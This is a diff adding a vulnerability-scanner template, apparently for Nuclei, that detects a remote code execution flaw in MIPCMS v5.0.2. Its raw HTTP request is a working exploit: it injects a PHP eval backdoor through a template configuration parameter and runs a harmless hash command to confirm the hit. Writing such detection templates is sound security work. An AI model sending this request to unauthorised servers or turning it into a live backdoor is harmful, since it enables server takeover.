@@ -1,0 +1,24 @@
+id: mipcms-index-siteview-rce
+info:
+  name: MIPCMS Index Siteview Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is an arbitrary code execution vulnerability in MIPCMS v5.0.2, which can be utilized by an attacker to execute arbitrary code, write a backdoor, and gain server permissions.
+  tags: rce,code-execution,mipcms
+  reference:
+    - https://www.mipjz.com
+http:
+  - raw:
+      - |
+        GET /index.php?s=/index/index/siteview&parent=index/index&config[tpl_replace_string][<!DOCTYPE]=<?php+@eval($_GET%5Ba%5D);?><!DOCTYPE&a=echo+md5(123);&config[tpl_cache]=0 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
